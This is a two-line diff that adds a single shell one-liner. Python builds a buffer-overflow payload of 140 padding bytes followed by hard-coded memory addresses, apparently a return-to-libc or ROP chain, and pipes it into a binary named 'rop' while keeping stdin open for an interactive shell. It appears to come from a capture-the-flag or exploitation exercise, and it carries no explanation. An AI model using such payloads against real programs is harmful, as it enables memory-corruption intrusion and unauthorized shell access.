@@ -1,0 +1,2 @@
+
+cat<(python -c 'print "\x69"*140+"\x00\xb2\xe1\xb7"+"\x69"*4+"\xcf\xc0\xf5\xb7"') - | ./rop
